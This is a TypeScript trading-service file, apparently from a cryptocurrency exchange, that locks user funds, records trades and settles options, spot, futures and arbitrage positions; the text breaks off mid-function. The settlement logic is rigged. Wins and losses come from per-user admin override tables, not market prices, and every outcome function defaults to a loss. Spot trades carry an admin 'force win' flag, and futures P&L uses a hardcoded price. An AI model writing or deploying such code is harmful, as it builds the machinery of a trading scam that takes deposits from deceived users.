// src/services/unified-trading-service.ts
import { supabase, supabaseAdmin } from '@/lib/supabase';
import { v4 as uuidv4 } from 'uuid';
import { OptionOrder } from '@/types/options-trading';

// ==================== TYPES ====================

export type TradeType = 'spot' | 'futures' | 'options' | 'arbitrage' | 'staking';

export interface AnyTrade {
  id: string;
  userId: string;
  type: TradeType;
  status: string;
  asset: string;
  amount: number;
  price?: number;
  total?: number;
  pnl?: number;
  fee?: number;
  metadata?: any;
  createdAt: string;
  updatedAt: string;
}

export interface SpotTrade extends AnyTrade {
  type: 'spot';
  pair: string;
  side: 'buy' | 'sell';
  filled: number;
  remaining: number;
}

export interface FuturesPosition extends AnyTrade {
  type: 'futures';
  symbol: string;
  side: 'long' | 'short';
  size: number;
  entryPrice: number;
  markPrice: number;
  leverage: number;
  margin: number;
  liquidationPrice: number;
  takeProfit?: number;
  stopLoss?: number;
}

export interface OptionContract extends AnyTrade {
  type: 'options';
  symbol: string;
  contractType: 'call' | 'put';
  strike: number;
  expiration: string;
  premium: number;
  payout: number;
}

export interface ArbitrageContract extends AnyTrade {
  type: 'arbitrage';
  productId: string;
  productLabel: string;
  duration: number;
  dailyRate: number;
  startTime: string;
  endTime?: string;
}

export interface StakingPosition extends AnyTrade {
  type: 'staking';
  asset: string;
  apy: number;
  rewards: number;
  startTime: string;
  endTime?: string;
}

export interface TradeExecutionRequest {
  type: TradeType;
  data: any;
  userId: string;
}

export interface TradeResult {
  success: boolean;
  tradeId?: string;
  error?: string;
  trade?: AnyTrade;
}

// ==================== SERVICE ====================

class UnifiedTradingService {
  private static instance: UnifiedTradingService;

  static getInstance(): UnifiedTradingService {
    if (!UnifiedTradingService.instance) {
      UnifiedTradingService.instance = new UnifiedTradingService();
    }
    return UnifiedTradingService.instance;
  }

  // ==================== P&L TARGET CHECKING ====================

  /**
   * Check if user has reached P&L targets and handle notifications
   */
  private async checkAndUpdatePnLTargets(
    userId: string, 
    tradeType: 'spot' | 'futures' | 'options' | 'arbitrage',
    pnlChange: number
  ): Promise<{ targetAchieved: boolean; targetType: 'profit' | 'loss' | null }> {
    try {
      // Skip P&L target tracking for now since columns don't exist in database
      // TODO: Add P&L tracking columns to trade_outcomes table if needed
      return { targetAchieved: false, targetType: null };
    } catch (error) {
      console.error('Error checking P&L targets:', error);
      return { targetAchieved: false, targetType: null };
    }
  }

  /**
   * Create notification for P&L target achievement
   */
  private async createPnLTargetNotification(
    userId: string,
    tradeType: string,
    targetType: 'profit' | 'loss',
    targetValue: number,
    currentValue: number
  ): Promise<void> {
    try {
      // You can implement your notification system here
      // For now, just log to console
      
      // Optionally store in a notifications table
      await supabase
        .from('notifications')
        .insert({
          user_id: userId,
          type: 'pnl_target',
          title: `${tradeType.charAt(0).toUpperCase() + tradeType.slice(1)} ${targetType === 'profit' ? 'Profit' : 'Loss'} Target Reached`,
          message: `Your ${tradeType} trading has reached its ${targetType} target of ${Math.abs(targetValue)} USDT. Current P&L: ${currentValue.toFixed(2)} USDT.`,
          data: {
            tradeType,
            targetType,
            targetValue,
            currentValue,
            timestamp: new Date().toISOString()
          },
          read: false,
          created_at: new Date().toISOString()
        });
    } catch (error) {
      console.error('Error creating notification:', error);
    }
  }

  // ==================== OPTIONS TRADING ====================

  async getActiveOptionsOrders(userId: string): Promise<OptionOrder[]> {
    try {
      const { data, error } = await supabase
        .from('option_orders')
        .select('*')
        .eq('user_id', userId)
        .eq('status', 'ACTIVE')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Error fetching active options orders:', error);
        return [];
      }

      return data?.map(order => ({
        id: order.id,
        userId: order.user_id,
        symbol: order.symbol,
        direction: order.direction,
        stake: order.stake,
        entryPrice: order.entry_price,
        expiryPrice: order.expiry_price,
        profit: order.profit,
        fee: order.fee,
        duration: order.duration,
        startTime: order.start_time,
        endTime: order.end_time,
        status: order.status,
        payoutRate: order.payout_rate,
        fluctuationRange: order.fluctuation_range,
        createdAt: order.created_at,
        completedAt: order.completed_at,
        pnl: order.pnl
      })) || [];
    } catch (error) {
      console.error('Error in getActiveOptionsOrders:', error);
      return [];
    }
  }

  async getCompletedOptionsOrders(userId: string): Promise<OptionOrder[]> {
    try {
      const { data, error } = await supabase
        .from('option_orders')
        .select('*')
        .eq('user_id', userId)
        .eq('status', 'COMPLETED')
        .order('completed_at', { ascending: false });

      if (error) {
        console.error('Error fetching completed options orders:', error);
        return [];
      }

      return data?.map(order => ({
        id: order.id,
        userId: order.user_id,
        symbol: order.symbol,
        direction: order.direction,
        stake: order.stake,
        entryPrice: order.entry_price,
        expiryPrice: order.expiry_price,
        profit: order.profit,
        fee: order.fee,
        duration: order.duration,
        startTime: order.start_time,
        endTime: order.end_time,
        status: order.status,
        payoutRate: order.payout_rate,
        fluctuationRange: order.fluctuation_range,
        createdAt: order.created_at,
        completedAt: order.completed_at,
        pnl: order.pnl
      })) || [];
    } catch (error) {
      console.error('Error in getCompletedOptionsOrders:', error);
      return [];
    }
  }

  async saveOptionOrder(order: OptionOrder): Promise<void> {
    try {
      const { error } = await supabase
        .from('option_orders')
        .insert({
          id: order.id,
          user_id: order.userId,
          symbol: order.symbol,
          direction: order.direction,
          stake: order.stake,
          entry_price: order.entryPrice,
          expiry_price: order.expiryPrice,
          profit: order.profit,
          fee: order.fee,
          duration: order.duration,
          start_time: order.startTime,
          end_time: order.endTime,
          status: order.status,
          payout_rate: order.payoutRate,
          fluctuation_range: order.fluctuationRange,
          created_at: order.createdAt,
          completed_at: order.completedAt,
          pnl: order.pnl
        });

      if (error) {
        console.error('Error saving option order:', error);
        throw error;
      }
    } catch (error) {
      console.error('Error in saveOptionOrder:', error);
      throw error;
    }
  }

  async updateOptionOrder(order: OptionOrder): Promise<void> {
    try {
      const { error } = await supabase
        .from('option_orders')
        .update({
          expiry_price: order.expiryPrice,
          status: order.status,
          completed_at: order.completedAt,
          pnl: order.pnl
        })
        .eq('id', order.id);

      if (error) {
        console.error('Error updating option order:', error);
        throw error;
      }
    } catch (error) {
      console.error('Error in updateOptionOrder:', error);
      throw error;
    }
  }

  // ==================== OPTIONS EXPIRATION ====================

  async expireOptionsTrade(tradeId: string): Promise<{ success: boolean; result: 'win' | 'loss'; profit?: number; error?: string }> {
    try {
      console.log(`⏰ [unifiedTradingService] Expiring options trade:`, { tradeId });

      // Get the trade from database
      const { data: trade, error } = await supabaseAdmin
        .from('trades')
        .select('*')
        .eq('id', tradeId)
        .single();

      if (error || !trade) {
        console.error('Trade not found:', error);
        return { success: false, result: 'loss', error: 'Trade not found' };
      }


      // Determine win/loss outcome
      const wins = await this.determineOptionsOutcome(trade);
      const result = wins ? 'win' : 'loss';


      // Calculate profit/loss
      const premium = Number(trade.amount) || 0;
      const payoutRate = Number(trade.metadata?.payoutRate) || 0.85;
      const profit = wins ? premium * payoutRate : -premium; // Net profit (positive for win, negative for loss)
      const totalReturn = wins ? premium + (premium * payoutRate) : 0; // Full return: stake + profit

      // Update P&L targets for options trading
      if (trade.user_id) {
        await this.checkAndUpdatePnLTargets(trade.user_id, 'options', profit);
      }

      // Update trade record using admin client to bypass RLS
      const { error: updateError } = await supabaseAdmin
        .from('trades')
        .update({
          status: result === 'win' ? 'completed' : 'failed',
          pnl: profit,
          metadata: {
            ...trade.metadata,
            outcome: result,
            settledAt: new Date().toISOString(),
            profit: profit
          },
          updated_at: new Date().toISOString()
        })
        .eq('id', tradeId);

      if (updateError) {
        console.error('❌ [unifiedTradingService] Error updating trade:', updateError);
        console.error('❌ [unifiedTradingService] Update error details:', {
          message: updateError.message,
          details: updateError.details,
          hint: updateError.hint,
          code: updateError.code
        });
        // Continue with balance updates even if trade update fails
      } else {
      }

      // Handle balance updates
      if (wins) {
        // Win: Return stake + profit to trading wallet
        // totalReturn already includes stake + profit
        
        // Update trading wallet balance directly
        const { data: currentBalance } = await supabase
          .from('wallet_balances')
          .select('available, locked')
          .eq('user_id', trade.user_id)
          .eq('asset', 'USDT_TRADING')
          .maybeSingle();

        if (currentBalance) {
          const newAvailable = Number(currentBalance.available) + totalReturn;
          await supabase
            .from('wallet_balances')
            .update({ 
              available: newAvailable,
              updated_at: new Date().toISOString()
            })
            .eq('user_id', trade.user_id)
            .eq('asset', 'USDT_TRADING');
        }
        
      } else {
        // Loss: Keep the locked amount (already deducted), no return needed
      }

      // Release the trading lock
      await supabase
        .from('trading_locks')
        .update({ 
          status: 'released',
          released_at: new Date().toISOString()
        })
        .eq('reference_id', tradeId);

      return { 
        success: true, 
        result, 
        profit 
      };

    } catch (error) {
      console.error('❌ [unifiedTradingService] Error expiring options trade:', error);
      return { 
        success: false, 
        result: 'loss', 
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  private async determineOptionsOutcome(trade: any): Promise<boolean> {
    try {
      console.log(`🔍 [unifiedTradingService] Determining outcome for user: ${trade.user_id}, trade: ${trade.id}`);
      
      // Use admin client to bypass RLS
      const { data: userOutcome, error } = await supabaseAdmin
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', trade.user_id)
        .maybeSingle();

      if (error) {
        console.error('❌ [unifiedTradingService] Error fetching user outcome:', error);
      }


      if (userOutcome && userOutcome.enabled) {
        // Check if options trading is enabled for this user
        if (userOutcome.options_enabled) {
          const outcome = userOutcome.outcome_type;
          
          switch (outcome) {
            case 'win':
              return true;
            case 'loss':
              return false;
            case 'default':
              // Fall through to default loss
              break;
          }
        } else {
        }
      }

      // Check for time-based windows using admin client
      const { data: activeWindows, error: windowsError } = await supabaseAdmin
        .from('trade_windows')
        .select('*')
        .eq('user_id', trade.user_id)
        .eq('active', true)
        .lte('start_time', new Date().toISOString())
        .gte('end_time', new Date().toISOString())
        .maybeSingle();

      if (windowsError) {
        console.error('❌ [unifiedTradingService] Error fetching active windows:', windowsError);
      }

      if (activeWindows && activeWindows.options_enabled) {
        const outcome = activeWindows.outcome_type;
        
        switch (outcome) {
          case 'win':
            return true;
          case 'loss':
            return false;
          case 'default':
            // Fall through to default loss
            break;
        }
      }

      // Default to loss (not random)
      return false; // Default to loss
      
    } catch (error) {
      console.error('Error determining options outcome:', error);
      // Fallback to loss
      return false;
    }
  }

  private async determineSpotOutcome(trade: any): Promise<boolean> {
    try {
      console.log(`🔍 [unifiedTradingService] Determining spot outcome for user: ${trade.user_id}, trade: ${trade.id}`);
      
      // Use admin client to bypass RLS
      const { data: userOutcome, error } = await supabaseAdmin
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', trade.user_id)
        .maybeSingle();

      if (error) {
        console.error('❌ [unifiedTradingService] Error fetching user outcome:', error);
      }

      if (userOutcome && userOutcome.enabled) {
        // Check if spot trading is enabled for this user
        if (userOutcome.spot_enabled) {
          const outcome = userOutcome.outcome_type;
          
          switch (outcome) {
            case 'win':
              return true;
            case 'loss':
              return false;
            case 'default':
              // Fall through to default loss
              break;
          }
        } else {
        }
      }

      // Check for time-based windows using admin client
      const { data: activeWindows, error: windowsError } = await supabaseAdmin
        .from('trade_windows')
        .select('*')
        .eq('user_id', trade.user_id)
        .eq('active', true)
        .lte('start_time', new Date().toISOString())
        .gte('end_time', new Date().toISOString())
        .maybeSingle();

      if (windowsError) {
        console.error('❌ [unifiedTradingService] Error fetching active windows:', windowsError);
      }

      if (activeWindows && activeWindows.spot_enabled) {
        const outcome = activeWindows.outcome_type;
        
        switch (outcome) {
          case 'win':
            return true;
          case 'loss':
            return false;
          case 'default':
            // Fall through to default loss
            break;
        }
      }

      // Default to loss (not random)
      return false; // Default to loss
      
    } catch (error) {
      console.error('Error determining spot outcome:', error);
      // Fallback to loss
      return false;
    }
  }

  private async determineFuturesOutcome(trade: any): Promise<boolean> {
    try {
      console.log(`🔍 [unifiedTradingService] Determining futures outcome for user: ${trade.user_id}, trade: ${trade.id}`);
      
      // Use admin client to bypass RLS
      const { data: userOutcome, error } = await supabaseAdmin
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', trade.user_id)
        .maybeSingle();

      if (error) {
        console.error('❌ [unifiedTradingService] Error fetching user outcome:', error);
      }

      if (userOutcome && userOutcome.enabled) {
        // Check if futures trading is enabled for this user
        if (userOutcome.futures_enabled) {
          const outcome = userOutcome.outcome_type;
          
          switch (outcome) {
            case 'win':
              return true;
            case 'loss':
              return false;
            case 'default':
              // Fall through to default loss
              break;
          }
        } else {
        }
      }

      // Check for time-based windows using admin client
      const { data: activeWindows, error: windowsError } = await supabaseAdmin
        .from('trade_windows')
        .select('*')
        .eq('user_id', trade.user_id)
        .eq('active', true)
        .lte('start_time', new Date().toISOString())
        .gte('end_time', new Date().toISOString())
        .maybeSingle();

      if (windowsError) {
        console.error('❌ [unifiedTradingService] Error fetching active windows:', windowsError);
      }

      if (activeWindows && activeWindows.futures_enabled) {
        const outcome = activeWindows.outcome_type;
        
        switch (outcome) {
          case 'win':
            return true;
          case 'loss':
            return false;
          case 'default':
            // Fall through to default loss
            break;
        }
      }

      // Default to loss (not random)
      return false; // Default to loss
      
    } catch (error) {
      console.error('Error determining futures outcome:', error);
      // Fallback to loss
      return false;
    }
  }

  private async determineArbitrageOutcome(trade: any): Promise<boolean> {
    try {
      console.log(`🔍 [unifiedTradingService] Determining arbitrage outcome for user: ${trade.user_id}, trade: ${trade.id}`);
      
      // Use admin client to bypass RLS
      const { data: userOutcome, error } = await supabaseAdmin
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', trade.user_id)
        .maybeSingle();

      if (error) {
        console.error('❌ [unifiedTradingService] Error fetching user outcome:', error);
      }

      if (userOutcome && userOutcome.enabled) {
        // Check if arbitrage is enabled for this user
        if (userOutcome.arbitrage_enabled) {
          const outcome = userOutcome.outcome_type;
          
          switch (outcome) {
            case 'win':
              return true;
            case 'loss':
              return false;
            case 'default':
              // Fall through to default loss
              break;
          }
        } else {
        }
      }

      // Check for time-based windows using admin client
      const { data: activeWindows, error: windowsError } = await supabaseAdmin
        .from('trade_windows')
        .select('*')
        .eq('user_id', trade.user_id)
        .eq('active', true)
        .lte('start_time', new Date().toISOString())
        .gte('end_time', new Date().toISOString())
        .maybeSingle();

      if (windowsError) {
        console.error('❌ [unifiedTradingService] Error fetching active windows:', windowsError);
      }

      if (activeWindows && activeWindows.arbitrage_enabled) {
        const outcome = activeWindows.outcome_type;
        
        switch (outcome) {
          case 'win':
            return true;
          case 'loss':
            return false;
          case 'default':
            // Fall through to default loss
            break;
        }
      }

      // Default to loss (not random)
      return false; // Default to loss
      
    } catch (error) {
      console.error('Error determining arbitrage outcome:', error);
      // Fallback to loss
      return false;
    }
  }

  // ==================== TRADE EXECUTION ====================

  async executeTrade(request: TradeExecutionRequest): Promise<TradeResult> {
    const { type, data, userId } = request;
    const tradeId = uuidv4();

    console.log(`🚀 [unifiedTradingService] executeTrade called:`, { type, data, userId, tradeId });

    try {
      // Lock funds first
      const lockResult = await this.lockFunds(userId, tradeId, type, data);
      if (!lockResult.success) {
        return {
          success: false,
          tradeId,
          error: lockResult.error
        };
      }

      // Create trade record
      const trade = await this.createTradeRecord(tradeId, type, data, userId);
      
      // Execute trade logic based on type
      const result = await this.executeTradeLogic(trade, data);

      return {
        success: true,
        tradeId,
        trade
      };

    } catch (error) {
      // Unlock funds on failure
      try {
        const { asset, amount } = this.calculateRequiredFunds(type, data);
        await supabase
          .from('trading_locks')
          .update({ 
            status: 'expired',
            released_at: new Date().toISOString()
          })
          .eq('reference_id', tradeId);
        
        // Get current balance from wallet_balances first (check trading wallet first)
        const tradingAsset = `${asset}_TRADING`;
        const { data: tradingWallet } = await supabase
          .from('wallet_balances')
          .select('available, locked')
          .eq('user_id', userId)
          .eq('asset', tradingAsset)
          .maybeSingle();
          
        let currentWallet = tradingWallet;
        let targetAsset = tradingAsset;
        
        // If no trading wallet, check regular wallet
        if (!tradingWallet) {
          const { data: regularWallet } = await supabase
            .from('wallet_balances')
            .select('available, locked')
            .eq('user_id', userId)
            .eq('asset', asset)
            .maybeSingle();
          currentWallet = regularWallet;
          targetAsset = asset;
        }
          
        if (currentWallet) {
          const newAvailableBalance = Number(currentWallet.available) + amount;
          const newLockedBalance = Number(currentWallet.locked) - amount;
          
          await supabase
            .from('wallet_balances')
            .update({ 
              available: newAvailableBalance,
              locked: newLockedBalance,
              updated_at: new Date().toISOString()
            })
            .eq('user_id', userId)
            .eq('asset', targetAsset);
        }
      } catch (unlockError) {
        console.error('Failed to unlock funds:', unlockError);
      }
      
      return {
        success: false,
        tradeId,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  // ==================== FUNDS CALCULATION ====================
  
  private calculateRequiredFunds(type: TradeType, data: any): { asset: string; amount: number; total: number } {
    console.log(`🧮 [unifiedTradingService] calculateRequiredFunds called:`, { type, data });
    
    // Validate input data
    if (!data) {
      throw new Error('Trade data is required');
    }
    
    switch (type) {
      case 'spot':
        const spotAmount = Number(data.amount) || 0;
        if (spotAmount <= 0) {
          throw new Error('Invalid spot trade amount');
        }
        return {
          asset: 'USDT',
          amount: spotAmount,
          total: spotAmount * (Number(data.price) || 0)
        };
        
      case 'futures':
        const futuresAmount = Number(data.amount) || 0;
        const leverage = Number(data.leverage) || 1;
        if (futuresAmount <= 0) {
          throw new Error('Invalid futures trade amount');
        }
        const margin = futuresAmount / leverage;
        return {
          asset: 'USDT',
          amount: futuresAmount,
          total: margin
        };
        
      case 'options':
        const premium = Number(data.premium) || 0;
        if (premium <= 0) {
          throw new Error('Invalid options premium');
        }
        return {
          asset: 'USDT',
          amount: premium,
          total: premium
        };
        
      case 'arbitrage':
        const arbitrageAmount = Number(data.amount) || 0;
        if (arbitrageAmount <= 0) {
          throw new Error('Invalid arbitrage amount');
        }
        return {
          asset: 'USDT',
          amount: arbitrageAmount,
          total: arbitrageAmount
        };
        
      case 'staking':
        const stakingAmount = Number(data.amount) || 0;
        const stakingAsset = data.asset || 'USDT';
        if (stakingAmount <= 0) {
          throw new Error('Invalid staking amount');
        }
        return {
          asset: stakingAsset,
          amount: stakingAmount,
          total: stakingAmount
        };
        
      default:
        throw new Error(`Unknown trade type: ${type}`);
    }
  }

  // ==================== FUNDS LOCKING ====================

  private async lockFunds(userId: string, referenceId: string, type: TradeType, data: any): Promise<{ success: boolean; error?: string }> {
    try {
      console.log(`🔒 [unifiedTradingService] lockFunds called:`, { userId, referenceId, type, data });
      console.log(`🔒 [unifiedTradingService] User ID type:`, typeof userId);
      console.log(`🔒 [unifiedTradingService] User ID length:`, userId?.length);
      
      const { asset, amount } = this.calculateRequiredFunds(type, data);
      
      console.log(`💰 [unifiedTradingService] Calculated funds:`, { asset, amount });

      // Validate amount
      if (!amount || amount <= 0) {
        return { success: false, error: `Invalid amount: ${amount}` };
      }

      // Check available balance from wallet_balances table (use trading wallet for trading operations)
      const tradingAsset = `${asset}_TRADING`;
      console.log(`🔍 [unifiedTradingService] Checking trading wallet for:`, tradingAsset);
      
      const { data: wallet, error: walletError } = await supabase
        .from('wallet_balances')
        .select('available, locked')
        .eq('user_id', userId)
        .eq('asset', tradingAsset)
        .maybeSingle();

      console.log(`📊 [unifiedTradingService] Trading wallet query result:`, { wallet, walletError });

      // If no trading wallet found, fall back to regular wallet
      let fallbackWallet = null;
      let fallbackError = null;
      if (!wallet) {
        console.log(`🔄 [unifiedTradingService] No trading wallet found, checking regular wallet for:`, asset);
        const { data: fallback, error: error } = await supabase
          .from('wallet_balances')
          .select('available, locked')
          .eq('user_id', userId)
          .eq('asset', asset)
          .maybeSingle();
        fallbackWallet = fallback;
        fallbackError = error;
      }

      const targetWallet = wallet || fallbackWallet;

      if (!targetWallet) {
        const errorMsg = `Wallet not found. Trading wallet: ${!!wallet}, Regular wallet: ${!!fallbackWallet}. Errors: ${walletError?.message || fallbackError?.message || 'None'}`;
        console.error(`❌ [unifiedTradingService] ${errorMsg}`);
        return { success: false, error: errorMsg };
      }

      const availableBalance = Number(targetWallet.available || 0);
      
      if (availableBalance < amount) {
        const errorMsg = `Insufficient trading balance. Available: ${availableBalance}, Required: ${amount}`;
        console.error(`❌ [unifiedTradingService] ${errorMsg}`);
        return { success: false, error: errorMsg };
      }

      // Create lock record
      const expiresAt = new Date();
      expiresAt.setMinutes(expiresAt.getMinutes() + 30); // 30 minute expiry
      
      const lockData = {
        id: uuidv4(),
        user_id: userId,
        asset,
        amount,
        lock_type: type,
        reference_id: referenceId,
        status: 'locked',
        expires_at: expiresAt.toISOString(),
        created_at: new Date().toISOString()
      };


      const { error: insertError } = await supabase
        .from('trading_locks')
        .insert(lockData);


      if (insertError) {
        const errorMsg = `Failed to lock funds: ${insertError.message}`;
        console.error('❌ [unifiedTradingService]', errorMsg);
        console.error('❌ [unifiedTradingService] Full error details:', insertError);
        return { 
          success: false, 
          error: errorMsg 
        };
      }

      // Update wallet_balances table (use trading asset if trading wallet exists)
      const targetAsset = wallet ? tradingAsset : asset;
      const currentLocked = Number(targetWallet.locked || 0);
      const currentAvailable = Number(targetWallet.available || 0);
      const newLockedBalance = currentLocked + amount;
      const newAvailableBalance = currentAvailable - amount;
      
      
      const { error: updateError } = await supabase
        .from('wallet_balances')
        .update({ 
          available: newAvailableBalance,
          locked: newLockedBalance,
          updated_at: new Date().toISOString()
        })
        .eq('user_id', userId)
        .eq('asset', targetAsset);


      if (updateError) {
        const errorMsg = `Failed to update wallet balance: ${updateError.message}`;
        console.error('❌ [unifiedTradingService]', errorMsg);
        console.error('❌ [unifiedTradingService] Full error details:', updateError);
        return { 
          success: false, 
          error: errorMsg 
        };
      }

      return { success: true };

    } catch (error) {
      console.error('❌ [unifiedTradingService] Exception in lockFunds:', error);
      console.error('❌ [unifiedTradingService] Error type:', typeof error);
      console.error('❌ [unifiedTradingService] Error message:', error instanceof Error ? error.message : String(error));
      console.error('❌ [unifiedTradingService] Error stack:', error instanceof Error ? error.stack : 'No stack trace');
      
      const errorMessage = error instanceof Error ? error.message : `Unknown error: ${String(error)}`;
      return {
        success: false,
        error: errorMessage
      };
    }
  }

  // ==================== TRADE CREATION ====================

  private async createTradeRecord(tradeId: string, type: TradeType, data: any, userId: string): Promise<AnyTrade> {
    const now = new Date().toISOString();
    const { asset, amount, total } = this.calculateRequiredFunds(type, data);

    console.log('🔍 [UnifiedTradingService] createTrade called with:', {
      type,
      data,
      userId: userId,
      userId_type: typeof userId
    });

    let trade: AnyTrade;

    switch (type) {
      case 'spot':
        // Check admin settings BEFORE starting trading using admin client to bypass RLS
        const { data: userOutcome, error } = await supabaseAdmin
          .from('trade_outcomes')
          .select('*')
          .eq('user_id', userId)
          .maybeSingle();

        if (error) {
          console.error('❌ [UnifiedTradingService] Error fetching user outcome:', error);
        }

        const isAdminForceWin = userOutcome?.enabled && 
                                    userOutcome.spot_enabled && 
                                    userOutcome.outcome_type === 'win';

        trade = {
          id: tradeId,
          userId,
          type: 'spot',
          status: 'active',           // Active order, not filled
          asset,
          amount: data.amount,
          price: data.price,
          total,
          metadata: {
            pair: data.pair,
            side: data.side,
            orderType: data.orderType || 'market',
            filled: 0,              // Nothing filled yet
            remaining: data.amount,    // Full amount remaining
            stopLoss: data.stopLoss,
            takeProfit: data.takeProfit,
            startTime: new Date().toISOString(),
            balanceDeductionRate: isAdminForceWin ? -1.03 : 1.03, // Negative for admin win mode
            currentBalance: total,
            originalStake: total,
            adminForceWin: isAdminForceWin // Track admin force win mode
          },
          createdAt: now,
          updatedAt: now
        } as SpotTrade;
        break;

      case 'futures':
        trade = {
          id: tradeId,
          userId,
          type: 'futures',
          status: 'open',              // Open position, not active
          asset,
          amount: data.amount,
          price: data.price,
          total,
          metadata: {
            symbol: data.symbol,
            side: data.side,
            positionType: 'open',           // Open position
            orderType: data.orderType || 'market',
            leverage: data.leverage,
            size: data.amount,
            entryPrice: data.price,
            markPrice: data.price,
            margin: total,
            liquidationPrice: data.side === 'long' ? data.price * 0.9 : data.price * 1.1,
            unrealizedPnl: 0,              // No P&L yet
            openTime: new Date().toISOString(),
            // Track admin settings for futures
            adminForceWin: false,           // Separate from spot
            adminForceLoss: false
          },
          createdAt: now,
          updatedAt: now
        } as FuturesPosition;
        break;

      case 'options':
        trade = {
          id: tradeId,
          userId,
          type: 'options',
          status: 'active',
          asset,
          amount: data.premium,
          price: data.premium,
          total: data.premium,
          metadata: {
            symbol: data.symbol,
            contractType: data.contractType,
            strike: data.strike,
            expiration: data.expiration,
            premium: data.premium,
            payout: data.payout
          },
          createdAt: now,
          updatedAt: now
        } as OptionContract;
        break;

      case 'arbitrage':
        trade = {
          id: tradeId,
          userId,
          type: 'arbitrage',
          status: 'active',
          asset,
          amount: data.amount,
          total: data.amount,
          metadata: {
            productId: data.productId,
            productLabel: data.productLabel,
            duration: data.duration,
            dailyRate: data.dailyRate,
            startTime: now
          },
          createdAt: now,
          updatedAt: now
        } as ArbitrageContract;
        break;

      case 'staking':
        trade = {
          id: tradeId,
          userId,
          type: 'staking',
          status: 'active',
          asset,
          amount: data.amount,
          total: data.amount,
          metadata: {
            asset: data.asset,
            apy: data.apy,
            rewards: 0,
            startTime: now
          },
          createdAt: now,
          updatedAt: now
        } as StakingPosition;
        break;

      default:
        throw new Error(`Unknown trade type: ${type}`);
    }

    // Save to trades table
    const saved = await this.saveTrade(trade);
    if (!saved) {
      throw new Error('Failed to save trade to database');
    }

    return trade;
  }

  private async saveTrade(trade: AnyTrade): Promise<boolean> {
  try {
    console.log('💾 [UnifiedTradingService] Saving trade to unified table:', {
      id: trade.id,
      type: trade.type,
      status: trade.status,
      asset: trade.asset,
      amount: trade.amount
    });

    // Map trade to the trades table structure
    const userId = (trade as any).userId || (trade as any).user_id;
    console.log('🔍 [UnifiedTradingService] Saving trade with user_id:', {
      userId: userId,
      userId_type: typeof userId,
      userId_length: userId?.length,
      original_trade_userId: (trade as any).userId,
      original_trade_userId_type: typeof (trade as any).userId,
      original_trade_user_id: (trade as any).user_id,
      original_trade_user_id_type: typeof (trade as any).user_id
    });

    const tradeRecord = {
      id: trade.id,
      user_id: userId,
      type: trade.type,
      status: (trade as any).status || 'active',
      asset: (trade as any).asset || (trade as any).symbol || ((trade as any).pair?.replace('/', '')) || 'BTCUSDT',
      amount: (trade as any).amount || (trade as any).size || (trade as any).premium || 0,
      price: (trade as any).price || (trade as any).entry_price || (trade as any).strike_price || null,
      total: (trade as any).total || ((trade as any).amount * (trade as any).price) || null,
      pnl: (trade as any).pnl || null,
      fee: (trade as any).fee || null,
      metadata: (trade as any).metadata || trade || {},
      created_at: (trade as any).createdAt || (trade as any).created_at || new Date().toISOString(),
      updated_at: new Date().toISOString()
    };

    const { error } = await supabase
      .from('trades')
      .insert(tradeRecord);

    if (error) {
      console.error('❌ [UnifiedTradingService] Error saving trade:', error);
      return false;
    }

    return true;
  } catch (error) {
    console.error('❌ [UnifiedTradingService] Exception saving trade:', error);
    return false;
  }
}

  // ==================== FUTURES TRADING PROCESSING ====================

  private async startFuturesTrading(trade: AnyTrade): Promise<void> {
    console.log(`📊 [unifiedTradingService] Starting futures trading for user: ${trade.userId}, position: ${trade.id}`);
    
    const tradingInterval = setInterval(async () => {
      try {
        // Get current position
        const { data: position } = await supabase
          .from('trades')
          .select('*')
          .eq('id', trade.id)
          .single();

        if (!position || position.status !== 'open') {
          clearInterval(tradingInterval);
          return;
        }

        // Calculate P&L based on current price vs entry price
        const currentPrice = 67000; // Would get from market data
        const entryPrice = position.metadata?.entryPrice || trade.price;
        const size = position.metadata?.size || trade.amount;
        const side = position.metadata?.side || 'buy';
        
        let unrealizedPnl = 0;
        if (side === 'long') {
          unrealizedPnl = (currentPrice - entryPrice) * size;
        } else {
          unrealizedPnl = (entryPrice - currentPrice) * size;
        }

        // Update P&L targets for futures (using unrealized PnL for tracking)
        if (trade.userId) {
          await this.checkAndUpdatePnLTargets(trade.userId, 'futures', unrealizedPnl - (position.metadata?.lastPnl || 0));
          
          // Store last PnL for next calculation
          position.metadata.lastPnl = unrealizedPnl;
        }

        // Check liquidation
        const liquidationPrice = position.metadata?.liquidationPrice;
        const isLiquidated = (side === 'long' && currentPrice <= liquidationPrice) ||
                           (side === 'short' && currentPrice >= liquidationPrice);

        if (isLiquidated) {
          // Liquidate position
          await this.liquidatePosition(trade.id, currentPrice, true);
          clearInterval(tradingInterval);
          return;
        }

        // Update position with current P&L
        await supabase
          .from('trades')
          .update({
            metadata: {
              ...position.metadata,
              markPrice: currentPrice,
              unrealizedPnl: unrealizedPnl,
              lastUpdateTime: new Date().toISOString()
            }
          })
          .eq('id', trade.id);


      } catch (error) {
        console.error('Error in futures trading interval:', error);
      }
    }, 2000); // Every 2 seconds

    // Store interval ID for cleanup
    await supabase
      .from('trades')
      .update({
        metadata: {
          ...trade.metadata,
          tradingIntervalId: tradingInterval.toString()
        }
      })
      .eq('id', trade.id);
  }

  private async liquidatePosition(positionId: string, currentPrice: number, isLiquidation: boolean): Promise<void> {
    try {
      console.log(`💥 [unifiedTradingService] Liquidating position: ${positionId} at price: ${currentPrice}`);

      // Get position
      const { data: position } = await supabase
        .from('trades')
        .select('*')
        .eq('id', positionId)
        .single();

      if (!position) return;

      const entryPrice = position.metadata?.entryPrice || 0;
      const size = position.metadata?.size || 0;
      const side = position.metadata?.side || 'long';
      const margin = position.metadata?.margin || 0;

      // Calculate final P&L
      let finalPnl = 0;
      if (side === 'long') {
        finalPnl = (currentPrice - entryPrice) * size;
      } else {
        finalPnl = (entryPrice - currentPrice) * size;
      }

      // Update P&L targets for futures
      if (position.user_id) {
        await this.checkAndUpdatePnLTargets(position.user_id, 'futures', finalPnl);
      }

      // Update position status
      await supabase
        .from('trades')
        .update({
          status: 'closed',
          pnl: finalPnl,
          metadata: {
            ...position.metadata,
            exitPrice: currentPrice,
            finalPnl: finalPnl,
            liquidated: isLiquidation,
            closeTime: new Date().toISOString()
          }
        })
        .eq('id', positionId);

      // Process balance changes
